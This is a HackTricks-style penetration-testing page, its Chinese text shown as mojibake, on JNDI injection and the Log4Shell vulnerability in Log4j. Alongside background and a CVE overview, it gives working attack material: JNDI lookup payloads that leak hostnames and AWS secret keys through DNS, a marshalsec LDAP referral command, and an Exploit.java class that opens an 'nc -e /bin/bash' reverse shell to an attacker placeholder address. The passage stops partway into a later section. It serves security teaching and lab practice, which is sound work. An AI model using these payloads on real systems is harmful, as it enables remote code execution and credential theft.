# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

JNDI è‡ª 1990 å¹´ä»£æœ«é›†æˆåˆ° Java ä¸­ï¼Œä½œä¸ºç›®å½•æœåŠ¡ï¼Œä½¿ Java ç¨‹åºèƒ½å¤Ÿé€šè¿‡å‘½åç³»ç»Ÿå®šä½æ•°æ®æˆ–å¯¹è±¡ã€‚å®ƒé€šè¿‡æœåŠ¡æä¾›è€…æ¥å£ (SPIs) æ”¯æŒå„ç§ç›®å½•æœåŠ¡ï¼Œå…è®¸ä»ä¸åŒç³»ç»Ÿæ£€ç´¢æ•°æ®ï¼ŒåŒ…æ‹¬è¿œç¨‹ Java å¯¹è±¡ã€‚å¸¸è§çš„ SPI åŒ…æ‹¬ CORBA COSã€Java RMI æ³¨å†Œè¡¨å’Œ LDAPã€‚

### JNDI å‘½åå‚è€ƒ

Java å¯¹è±¡å¯ä»¥ä½¿ç”¨ JNDI å‘½åå¼•ç”¨è¿›è¡Œå­˜å‚¨å’Œæ£€ç´¢ï¼Œå½¢å¼æœ‰ä¸¤ç§ï¼š

* **å¼•ç”¨åœ°å€**ï¼šæŒ‡å®šå¯¹è±¡çš„ä½ç½®ï¼ˆä¾‹å¦‚ï¼Œ_rmi://server/ref_ï¼‰ï¼Œå…è®¸ç›´æ¥ä»æŒ‡å®šåœ°å€æ£€ç´¢ã€‚
* **è¿œç¨‹å·¥å‚**ï¼šå¼•ç”¨è¿œç¨‹å·¥å‚ç±»ã€‚å½“è®¿é—®æ—¶ï¼Œè¯¥ç±»ä»è¿œç¨‹ä½ç½®ä¸‹è½½å¹¶å®ä¾‹åŒ–ã€‚

ç„¶è€Œï¼Œè¿™ç§æœºåˆ¶å¯èƒ½è¢«åˆ©ç”¨ï¼Œå¯èƒ½å¯¼è‡´åŠ è½½å’Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ä½œä¸ºå¯¹ç­–ï¼š

* **RMI**ï¼š`java.rmi.server.useCodeabseOnly = true` ä» JDK 7u21 å¼€å§‹é»˜è®¤è®¾ç½®ï¼Œé™åˆ¶è¿œç¨‹å¯¹è±¡åŠ è½½ã€‚å®‰å…¨ç®¡ç†å™¨è¿›ä¸€æ­¥é™åˆ¶å¯ä»¥åŠ è½½çš„å†…å®¹ã€‚
* **LDAP**ï¼š`com.sun.jndi.ldap.object.trustURLCodebase = false` ä» JDK 6u141ã€7u131ã€8u121 å¼€å§‹é»˜è®¤è®¾ç½®ï¼Œé˜»æ­¢æ‰§è¡Œè¿œç¨‹åŠ è½½çš„ Java å¯¹è±¡ã€‚å¦‚æœè®¾ç½®ä¸º `true`ï¼Œåˆ™å¯ä»¥åœ¨æ²¡æœ‰å®‰å…¨ç®¡ç†å™¨ç›‘ç£çš„æƒ…å†µä¸‹æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚
* **CORBA**ï¼šæ²¡æœ‰ç‰¹å®šå±æ€§ï¼Œä½†å®‰å…¨ç®¡ç†å™¨å§‹ç»ˆå¤„äºæ´»åŠ¨çŠ¶æ€ã€‚

ç„¶è€Œï¼Œè´Ÿè´£è§£æ JNDI é“¾æ¥çš„ **å‘½åç®¡ç†å™¨** ç¼ºä¹å†…ç½®å®‰å…¨æœºåˆ¶ï¼Œå¯èƒ½å…è®¸ä»ä»»ä½•æ¥æºæ£€ç´¢å¯¹è±¡ã€‚è¿™æ„æˆé£é™©ï¼Œå› ä¸º RMIã€LDAP å’Œ CORBA çš„ä¿æŠ¤æªæ–½å¯èƒ½è¢«ç»•è¿‡ï¼Œå¯¼è‡´åŠ è½½ä»»æ„ Java å¯¹è±¡æˆ–åˆ©ç”¨ç°æœ‰åº”ç”¨ç¨‹åºç»„ä»¶ï¼ˆå°å·¥å…·ï¼‰è¿è¡Œæ¶æ„ä»£ç ã€‚

å¯åˆ©ç”¨çš„ URL ç¤ºä¾‹åŒ…æ‹¬ï¼š

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

å°½ç®¡æœ‰ä¿æŠ¤æªæ–½ï¼Œæ¼æ´ä»ç„¶å­˜åœ¨ï¼Œä¸»è¦æ˜¯ç”±äºç¼ºä¹å¯¹ä»ä¸å—ä¿¡ä»»æ¥æºåŠ è½½ JNDI çš„ä¿æŠ¤ä»¥åŠç»•è¿‡ç°æœ‰ä¿æŠ¤çš„å¯èƒ½æ€§ã€‚

### JNDI ç¤ºä¾‹

![](<../../.gitbook/assets/image (1022).png>)

å³ä½¿æ‚¨å·²è®¾ç½® **`PROVIDER_URL`**ï¼Œæ‚¨ä»å¯ä»¥åœ¨æŸ¥æ‰¾ä¸­æŒ‡ç¤ºä¸åŒçš„ URLï¼Œå¹¶å°†å…¶è®¿é—®ï¼š`ctx.lookup("<attacker-controlled-url>")`ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…å°†åˆ©ç”¨çš„å†…å®¹ï¼Œä»ä»–æ§åˆ¶çš„ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡ã€‚

### CORBA æ¦‚è¿°

CORBAï¼ˆé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„ï¼‰ä½¿ç”¨ **å¯äº’æ“ä½œå¯¹è±¡å¼•ç”¨ (IOR)** å”¯ä¸€æ ‡è¯†è¿œç¨‹å¯¹è±¡ã€‚æ­¤å¼•ç”¨åŒ…å«å…³é”®ä¿¡æ¯ï¼Œå¦‚ï¼š

* **ç±»å‹ ID**ï¼šæ¥å£çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚
* **ä»£ç åº“**ï¼šè·å–å­˜æ ¹ç±»çš„ URLã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒCORBA æœ¬èº«å¹¶ä¸è„†å¼±ã€‚ç¡®ä¿å®‰å…¨é€šå¸¸æ¶‰åŠï¼š

* å®‰è£… **å®‰å…¨ç®¡ç†å™¨**ã€‚
* é…ç½®å®‰å…¨ç®¡ç†å™¨ä»¥å…è®¸è¿æ¥åˆ°æ½œåœ¨æ¶æ„çš„ä»£ç åº“ã€‚è¿™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š
* å¥—æ¥å­—æƒé™ï¼Œä¾‹å¦‚ï¼Œ`permissions java.net.SocketPermission "*:1098-1099", "connect";`ã€‚
* æ–‡ä»¶è¯»å–æƒé™ï¼Œå¯ä»¥æ˜¯é€šç”¨çš„ï¼ˆ`permission java.io.FilePermission "<<ALL FILES>>", "read";`ï¼‰æˆ–é’ˆå¯¹å¯èƒ½æ”¾ç½®æ¶æ„æ–‡ä»¶çš„ç‰¹å®šç›®å½•ã€‚

ç„¶è€Œï¼Œä¸€äº›ä¾›åº”å•†æ”¿ç­–å¯èƒ½ä¼šå®½æ¾ï¼Œé»˜è®¤å…è®¸è¿™äº›è¿æ¥ã€‚

### RMI ä¸Šä¸‹æ–‡

å¯¹äº RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œæƒ…å†µæœ‰äº›ä¸åŒã€‚ä¸ CORBA ä¸€æ ·ï¼Œé»˜è®¤æƒ…å†µä¸‹é™åˆ¶ä»»æ„ç±»ä¸‹è½½ã€‚è¦åˆ©ç”¨ RMIï¼Œé€šå¸¸éœ€è¦ç»•è¿‡å®‰å…¨ç®¡ç†å™¨ï¼Œè¿™åœ¨ CORBA ä¸­ä¹ŸåŒæ ·ç›¸å…³ã€‚

### LDAP

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åŒºåˆ†æœç´¢å’ŒæŸ¥æ‰¾ã€‚\
**æœç´¢**å°†ä½¿ç”¨ç±»ä¼¼ `ldap://localhost:389/o=JNDITutorial` çš„ URL ä» LDAP æœåŠ¡å™¨æŸ¥æ‰¾ JNDITutorial å¯¹è±¡å¹¶ **æ£€ç´¢å…¶å±æ€§**ã€‚\
**æŸ¥æ‰¾**æ—¨åœ¨ç”¨äº **å‘½åæœåŠ¡**ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è·å– **ç»‘å®šåˆ°åç§°çš„ä»»ä½•å†…å®¹**ã€‚

å¦‚æœ LDAP æœç´¢æ˜¯é€šè¿‡ **SearchControls.setReturningObjFlag() è®¾ç½®ä¸º `true` è°ƒç”¨çš„ï¼Œåˆ™è¿”å›çš„å¯¹è±¡å°†è¢«é‡å»º**ã€‚

å› æ­¤ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ”»å‡»è¿™äº›é€‰é¡¹ã€‚\
**æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡åœ¨ LDAP è®°å½•ä¸­å¼•å…¥æœ‰æ•ˆè´Ÿè½½æ¥æ±¡æŸ“å®ƒä»¬**ï¼Œè¿™äº›æœ‰æ•ˆè´Ÿè½½å°†åœ¨æ”¶é›†å®ƒä»¬çš„ç³»ç»Ÿä¸­æ‰§è¡Œï¼ˆå¦‚æœæ‚¨å¯ä»¥è®¿é—® LDAP æœåŠ¡å™¨ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥ **å¦¥åæ•°åå°æœºå™¨**ï¼‰ã€‚å¦ä¸€ç§åˆ©ç”¨æ­¤æ¼æ´çš„æ–¹æ³•æ˜¯æ‰§è¡Œ **MitM æ”»å‡»**ï¼Œä¾‹å¦‚åœ¨ LDAP æœç´¢ä¸­ã€‚

å¦‚æœæ‚¨å¯ä»¥ **ä½¿åº”ç”¨ç¨‹åºè§£æ JNDI LDAP URL**ï¼Œæ‚¨å¯ä»¥æ§åˆ¶å°†è¦æœç´¢çš„ LDAPï¼Œå¹¶å¯ä»¥è¿”å›æœ‰æ•ˆè´Ÿè½½ï¼ˆlog4shellï¼‰ã€‚

#### ååºåˆ—åŒ–æ¼æ´

![](<../../.gitbook/assets/image (275).png>)

**æ¼æ´æ˜¯åºåˆ—åŒ–çš„**ï¼Œå¹¶å°†è¢«ååºåˆ—åŒ–ã€‚\
å¦‚æœ `trustURLCodebase` ä¸º `true`ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»£ç åº“ä¸­æä¾›è‡ªå·±çš„ç±»ï¼›å¦‚æœä¸æ˜¯ï¼Œä»–å°†éœ€è¦åˆ©ç”¨ç±»è·¯å¾„ä¸­çš„å°å·¥å…·ã€‚

#### JNDI å¼•ç”¨æ¼æ´

ä½¿ç”¨ **JavaFactory å¼•ç”¨** æ”»å‡»æ­¤ LDAP æ›´å®¹æ˜“ï¼š

![](<../../.gitbook/assets/image (1059).png>)

## Log4Shell æ¼æ´

è¯¥æ¼æ´åœ¨ Log4j ä¸­å¼•å…¥ï¼Œå› ä¸ºå®ƒæ”¯æŒä¸€ç§ [**ç‰¹æ®Šè¯­æ³•**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)ï¼Œå½¢å¼ä¸º `${prefix:name}`ï¼Œå…¶ä¸­ `prefix` æ˜¯å¤šä¸ªä¸åŒçš„ [**æŸ¥æ‰¾**](https://logging.apache.org/log4j/2.x/manual/lookups.html) ä¹‹ä¸€ï¼Œ`name` åº”è¯¥è¢«è¯„ä¼°ã€‚ä¾‹å¦‚ï¼Œ`${java:version}` æ˜¯å½“å‰è¿è¡Œçš„ Java ç‰ˆæœ¬ã€‚

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) å¼•å…¥äº† `jndi` æŸ¥æ‰¾åŠŸèƒ½ã€‚æ­¤åŠŸèƒ½é€šè¿‡ JNDI å¯ç”¨å˜é‡çš„æ£€ç´¢ã€‚é€šå¸¸ï¼Œé”®ä¼šè‡ªåŠ¨ä»¥ `java:comp/env/` ä¸ºå‰ç¼€ã€‚ç„¶è€Œï¼Œå¦‚æœé”®æœ¬èº«åŒ…å« **":"**ï¼Œåˆ™ä¸ä¼šåº”ç”¨æ­¤é»˜è®¤å‰ç¼€ã€‚

åœ¨é”®ä¸­å­˜åœ¨ **:** æ—¶ï¼Œä¾‹å¦‚ `${jndi:ldap://example.com/a}`ï¼Œå°† **æ²¡æœ‰å‰ç¼€**ï¼Œå¹¶ä¸” **LDAP æœåŠ¡å™¨ä¼šæŸ¥è¯¢è¯¥å¯¹è±¡**ã€‚è¿™äº›æŸ¥æ‰¾å¯ä»¥åœ¨ Log4j çš„é…ç½®ä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨è®°å½•è¡Œæ—¶ä½¿ç”¨ã€‚

å› æ­¤ï¼Œè·å– RCE æ‰€éœ€çš„å”¯ä¸€æ¡ä»¶æ˜¯ **å¤„ç†ç”¨æˆ·æ§åˆ¶ä¿¡æ¯çš„ Log4j æ¼æ´ç‰ˆæœ¬**ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªè¢« Java åº”ç”¨ç¨‹åºå¹¿æ³›ä½¿ç”¨çš„åº“æ¥è®°å½•ä¿¡æ¯ï¼ˆåŒ…æ‹¬é¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œå› æ­¤é€šå¸¸ä¼šæœ‰ log4j è®°å½•ä¾‹å¦‚æ¥æ”¶åˆ°çš„ HTTP å¤´ä¿¡æ¯ï¼Œå¦‚ User-Agentã€‚ç„¶è€Œï¼Œlog4j **ä¸ä»…ç”¨äºè®°å½• HTTP ä¿¡æ¯ï¼Œè¿˜ç”¨äºè®°å½•å¼€å‘äººå‘˜æŒ‡ç¤ºçš„ä»»ä½•è¾“å…¥å’Œæ•°æ®**ã€‚

## Log4Shell ç›¸å…³ CVE æ¦‚è¿°

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[ä¸¥é‡]**

æ­¤æ¼æ´æ˜¯ `log4j-core` ç»„ä»¶ä¸­çš„ä¸€ä¸ªä¸¥é‡ **ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–ç¼ºé™·**ï¼Œå½±å“ç‰ˆæœ¬ä» 2.0-beta9 åˆ° 2.14.1ã€‚å®ƒå…è®¸ **è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)**ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ¥ç®¡ç³»ç»Ÿã€‚è¯¥é—®é¢˜ç”±é˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿçš„é™ˆå…†å†›æŠ¥å‘Šï¼Œå½±å“å¤šä¸ª Apache æ¡†æ¶ã€‚ç‰ˆæœ¬ 2.15.0 ä¸­çš„åˆå§‹ä¿®å¤ä¸å®Œæ•´ã€‚é˜²å¾¡çš„ Sigma è§„åˆ™å¯ç”¨ï¼ˆ[è§„åˆ™ 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml)ï¼Œ[è§„åˆ™ 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)ï¼‰ã€‚

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[ä¸¥é‡]**

æœ€åˆè¯„çº§ä¸ºä½ï¼Œä½†åæ¥å‡çº§ä¸ºä¸¥é‡ï¼Œæ­¤ CVE æ˜¯ç”±äº 2.15.0 å¯¹ CVE-2021-44228 çš„ä¿®å¤ä¸å®Œæ•´è€Œå¯¼è‡´çš„ **æ‹’ç»æœåŠ¡ (DoS)** ç¼ºé™·ã€‚å®ƒå½±å“éé»˜è®¤é…ç½®ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„æœ‰æ•ˆè´Ÿè½½é€ æˆ DoS æ”»å‡»ã€‚ä¸€ä¸ª [æ¨æ–‡](https://twitter.com/marcioalm/status/1471740771581652995) å±•ç¤ºäº†ä¸€ç§ç»•è¿‡æ–¹æ³•ã€‚è¯¥é—®é¢˜åœ¨ç‰ˆæœ¬ 2.16.0 å’Œ 2.12.2 ä¸­é€šè¿‡åˆ é™¤æ¶ˆæ¯æŸ¥æ‰¾æ¨¡å¼å’Œé»˜è®¤ç¦ç”¨ JNDI è§£å†³ã€‚

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[é«˜]**

å½±å“ **Log4j 1.x ç‰ˆæœ¬** åœ¨ä½¿ç”¨ `JMSAppender` çš„éé»˜è®¤é…ç½®ä¸­ï¼Œæ­¤ CVE æ˜¯ä¸€ä¸ªä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–ç¼ºé™·ã€‚1.x åˆ†æ”¯æ²¡æœ‰å¯ç”¨çš„ä¿®å¤ï¼Œå·²ç»“æŸç”Ÿå‘½å‘¨æœŸï¼Œå»ºè®®å‡çº§åˆ° `log4j-core 2.17.0`ã€‚

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[ä¸­ç­‰]**

æ­¤æ¼æ´å½±å“ **Logback æ—¥å¿—æ¡†æ¶**ï¼Œè¿™æ˜¯ Log4j 1.x çš„ç»§ä»»è€…ã€‚ä¹‹å‰è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œè¯¥æ¡†æ¶è¢«å‘ç°å­˜åœ¨æ¼æ´ï¼Œå¹¶å·²å‘å¸ƒæ–°ç‰ˆæœ¬ï¼ˆ1.3.0-alpha11 å’Œ 1.2.9ï¼‰ä»¥è§£å†³è¯¥é—®é¢˜ã€‚

### **CVE-2021-45105** **\[é«˜]**

Log4j 2.16.0 åŒ…å«ä¸€ä¸ª DoS ç¼ºé™·ï¼Œä¿ƒä½¿å‘å¸ƒ `log4j 2.17.0` æ¥ä¿®å¤è¯¥ CVEã€‚æ›´å¤šç»†èŠ‚è§ BleepingComputer çš„ [æŠ¥å‘Š](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)ã€‚

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

å½±å“ log4j ç‰ˆæœ¬ 2.17ï¼Œæ­¤ CVE è¦æ±‚æ”»å‡»è€…æ§åˆ¶ log4j çš„é…ç½®æ–‡ä»¶ã€‚å®ƒæ¶‰åŠé€šè¿‡é…ç½®çš„ JDBCAppender è¿›è¡Œæ½œåœ¨çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚æ›´å¤šç»†èŠ‚å¯åœ¨ [Checkmarx åšå®¢æ–‡ç« ](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) ä¸­æ‰¾åˆ°ã€‚

## Log4Shell åˆ©ç”¨

### å‘ç°

å¦‚æœæ²¡æœ‰ä¿æŠ¤ï¼Œæ­¤æ¼æ´éå¸¸å®¹æ˜“å‘ç°ï¼Œå› ä¸ºå®ƒå°†å‘æ‚¨åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­æŒ‡ç¤ºçš„åœ°å€å‘é€è‡³å°‘ä¸€ä¸ª **DNS è¯·æ±‚**ã€‚å› æ­¤ï¼Œåƒè¿™æ ·çš„æœ‰æ•ˆè´Ÿè½½ï¼š

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`ï¼ˆä½¿ç”¨ [canarytokens.com](https://canarytokens.org/generate)ï¼‰
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`ï¼ˆä½¿ç”¨ [interactsh](https://github.com/projectdiscovery/interactsh)ï¼‰
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`ï¼ˆä½¿ç”¨ Burp Suiteï¼‰
* `${jndi:ldap://2j4ayo.dnslog.cn}`ï¼ˆä½¿ç”¨ [dnslog](http://dnslog.cn)ï¼‰
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`ï¼ˆä½¿ç”¨ [huntress](https://log4shell.huntress.com)ï¼‰

è¯·æ³¨æ„ï¼Œ**å³ä½¿æ”¶åˆ° DNS è¯·æ±‚ï¼Œä¹Ÿä¸æ„å‘³ç€åº”ç”¨ç¨‹åºæ˜¯å¯åˆ©ç”¨çš„**ï¼ˆç”šè‡³ä¸è„†å¼±ï¼‰ï¼Œæ‚¨éœ€è¦å°è¯•åˆ©ç”¨å®ƒã€‚

{% hint style="info" %}
è¯·è®°ä½ï¼Œè¦ **åˆ©ç”¨ç‰ˆæœ¬ 2.15**ï¼Œæ‚¨éœ€è¦æ·»åŠ  **localhost æ£€æŸ¥ç»•è¿‡**ï¼š${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **æœ¬åœ°å‘ç°**

æœç´¢ **æœ¬åœ°æ˜“å—æ”»å‡»ç‰ˆæœ¬** çš„åº“ï¼š
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **éªŒè¯**

ä¹‹å‰åˆ—å‡ºçš„ä¸€äº›å¹³å°å°†å…è®¸æ‚¨æ’å…¥ä¸€äº›å˜é‡æ•°æ®ï¼Œè¿™äº›æ•°æ®å°†åœ¨è¯·æ±‚æ—¶è¢«è®°å½•ã€‚\
è¿™å¯¹äºä¸¤ä»¶äº‹éå¸¸æœ‰ç”¨ï¼š

* **éªŒè¯** æ¼æ´
* **åˆ©ç”¨** æ¼æ´ **æå–ä¿¡æ¯**

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç±»ä¼¼äºï¼š\
æˆ–åƒ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`**ï¼Œå¦‚æœæ”¶åˆ°çš„ **DNS è¯·æ±‚åŒ…å«ç¯å¢ƒå˜é‡çš„å€¼**ï¼Œæ‚¨å°±çŸ¥é“è¯¥åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ã€‚

æ‚¨å¯ä»¥å°è¯• **æ³„éœ²** çš„å…¶ä»–ä¿¡æ¯ï¼š
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE ä¿¡æ¯

{% hint style="info" %}
è¿è¡Œåœ¨ JDK ç‰ˆæœ¬é«˜äº 6u141ã€7u131 æˆ– 8u121 çš„ä¸»æœºå·²é’ˆå¯¹ LDAP ç±»åŠ è½½æ”»å‡»å‘é‡è¿›è¡Œäº†ä¿æŠ¤ã€‚è¿™æ˜¯ç”±äºé»˜è®¤ç¦ç”¨ `com.sun.jndi.ldap.object.trustURLCodebase`ï¼Œè¿™é˜²æ­¢äº† JNDI é€šè¿‡ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œè¿™äº›ç‰ˆæœ¬**å¹¶æœªä¿æŠ¤å…å—ååºåˆ—åŒ–æ”»å‡»å‘é‡**ã€‚

å¯¹äºæ—¨åœ¨åˆ©ç”¨è¿™äº›è¾ƒé«˜ JDK ç‰ˆæœ¬çš„æ”»å‡»è€…ï¼Œå¿…é¡»åœ¨ Java åº”ç”¨ç¨‹åºä¸­åˆ©ç”¨**å—ä¿¡ä»»çš„å·¥å…·**ã€‚åƒ ysoserial æˆ– JNDIExploit è¿™æ ·çš„å·¥å…·é€šå¸¸ç”¨äºæ­¤ç›®çš„ã€‚ç›¸åï¼Œåˆ©ç”¨è¾ƒä½çš„ JDK ç‰ˆæœ¬ç›¸å¯¹å®¹æ˜“ï¼Œå› ä¸ºè¿™äº›ç‰ˆæœ¬å¯ä»¥è¢«æ“çºµä»¥åŠ è½½å’Œæ‰§è¡Œä»»æ„ç±»ã€‚

æœ‰å…³**æ›´å¤šä¿¡æ¯**ï¼ˆ_ä¾‹å¦‚ RMI å’Œ CORBA å‘é‡çš„é™åˆ¶_ï¼‰ï¼Œ**è¯·æŸ¥çœ‹å‰é¢çš„ JNDI å‘½åå‚è€ƒéƒ¨åˆ†**æˆ– [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec ä¸è‡ªå®šä¹‰æœ‰æ•ˆè´Ÿè½½

æ‚¨å¯ä»¥åœ¨ **THM box** ä¸­æµ‹è¯•æ­¤å†…å®¹ï¼š [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

ä½¿ç”¨å·¥å…· [**marshalsec**](https://github.com/mbechler/marshalsec)ï¼ˆjar ç‰ˆæœ¬å¯åœ¨ [**è¿™é‡Œ**](https://github.com/RandomRobbieBF/marshalsec-jar) è·å–ï¼‰ã€‚æ­¤æ–¹æ³•å»ºç«‹ä¸€ä¸ª LDAP å¼•ç”¨æœåŠ¡å™¨ï¼Œä»¥å°†è¿æ¥é‡å®šå‘åˆ°ä¸€ä¸ªæ¬¡çº§ HTTP æœåŠ¡å™¨ï¼Œåœ¨è¯¥æœåŠ¡å™¨ä¸Šå°†æ‰˜ç®¡æ¼æ´ï¼š
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
è¦æç¤ºç›®æ ‡åŠ è½½åå‘ shell ä»£ç ï¼Œåˆ¶ä½œä¸€ä¸ªåä¸º `Exploit.java` çš„ Java æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
å°†Javaæ–‡ä»¶ç¼–è¯‘æˆç±»æ–‡ä»¶ï¼Œä½¿ç”¨ï¼š`javac Exploit.java -source 8 -target 8`ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨åŒ…å«ç±»æ–‡ä»¶çš„ç›®å½•ä¸­å¯åŠ¨ä¸€ä¸ª**HTTPæœåŠ¡å™¨**ï¼Œä½¿ç”¨ï¼š`python3 -m http.server`ã€‚ç¡®ä¿**marshalsec LDAPæœåŠ¡å™¨**å¼•ç”¨æ­¤HTTPæœåŠ¡å™¨ã€‚

é€šè¿‡å‘é€ç±»ä¼¼çš„æœ‰æ•ˆè´Ÿè½½æ¥è§¦å‘æ˜“å—æ”»å‡»çš„WebæœåŠ¡å™¨ä¸Šåˆ©ç”¨ç±»çš„æ‰§è¡Œï¼š
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**æ³¨æ„ï¼š** æ­¤æ¼æ´ä¾èµ–äºJavaçš„é…ç½®ï¼Œä»¥å…è®¸é€šè¿‡LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ã€‚å¦‚æœè¿™ä¸è¢«å…è®¸ï¼Œè¯·è€ƒè™‘åˆ©ç”¨å—ä¿¡ä»»çš„ç±»è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚

### RCE - **JNDIExploit**

{% hint style="info" %}
